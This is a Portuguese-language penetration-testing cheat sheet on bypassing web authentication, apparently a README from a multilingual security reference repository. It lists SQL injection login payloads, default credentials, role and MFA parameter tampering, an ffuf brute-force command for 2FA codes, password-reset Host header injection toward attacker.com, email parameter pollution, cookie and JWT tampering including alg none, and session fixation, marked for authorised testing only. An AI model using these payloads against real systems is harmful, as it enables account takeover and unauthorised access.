# 🔐 Guia de referência de contorno da autenticação

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de precisão:** alterar uma resposta no navegador, trocar um código de estado ou editar um JWT não contorna, por si só, a autenticação do servidor. Os exemplos só demonstram uma falha quando o servidor permite uma operação protegida sem validar os fatores, a sessão, a assinatura ou a autorização correspondentes. Confirme o acesso efetivo após a alteração. [Guia de autenticação multifator da PortSwigger](https://portswigger.net/web-security/authentication/multi-factor). 2FA utiliza dois fatores; MFA utiliza vários fatores. Um *token* representa informação ou autorização de acesso; uma *claim* é um atributo contido no JWT.

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

---

## 🔍 Técnicas de contorno da autenticação

### Injeção de SQL
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

### Credenciais predefinidas
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

### Manipulação de parâmetros
```http
# Alterar o tipo de utilizador
user_type=admin
role=administrator
isAdmin=true
admin=1

# Saltar a verificação
verified=true
mfa_verified=true
```

---

## 🔑 Contornar 2FA/MFA

### Manipulação de respostas
```http
# Alterar false para true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

### Manipulação de códigos de estado
```http
# Se o código for 401/403, experimentar alterá-lo para 200
# Utilizar um proxy para alterar a resposta
```

### Navegação direta
```http
# Após a autenticação, saltar a página de 2FA
/login → /2fa → /dashboard
# Experimentar aceder diretamente a /dashboard
```

### Códigos por força bruta
```bash
# Códigos de 4 algarismos
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

### Reutilização de códigos
```http
# Experimentar códigos antigos ou expirados
# Experimentar o mesmo código várias vezes
```

### Valores nulos ou vazios
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

## 🔓 Contornar a reposição da palavra-passe

### Injeção do cabeçalho Host
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Manipulação de tokens
```http
# Tokens previsíveis
token=1
token=admin
token=base64(user_id)

# Reutilização de tokens
# Utilizar o seu token de reposição com o endereço de e-mail da vítima
```

### Poluição de parâmetros
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

### Manipulação de respostas
```json
// Encontrar o token na resposta
{"token": "abc123", "email": "victim@target.com"}
```

---

## 🛡️ Contornar validações de sessões e cookies

### Manipulação de cookies
```http
# Alterar os valores
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

### Manipulação de JWT
```json
// Alterar os atributos do token (claims)
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

### Fixação de sessão
```http
# Associar a sessão do atacante à vítima
# A vítima inicia sessão com o identificador de sessão do atacante
```

---

## 📊 Referência rápida

| Tipo de contorno | Técnica |
|-------------|-----------|
| Autenticação | Injeção SQL e credenciais predefinidas |
| 2FA | Manipulação de respostas e força bruta |
| Reposição da palavra-passe | Cabeçalho Host e reutilização de tokens |
| Sessão | Manipulação de cookies e JWT |

### Pontos frequentemente vulneráveis
```
- Formulários de autenticação
- Fluxos de reposição da palavra-passe
- Implementações de 2FA/MFA
- Funções de memorização da sessão («lembrar-me»)
- Verificação de contas
- Implementações de OAuth
```

---

## 📚 Recursos

- [PortSwigger — autenticação](https://portswigger.net/web-security/authentication)
- [HackTricks — contorno da autenticação](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 Ponha a autenticação à prova!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
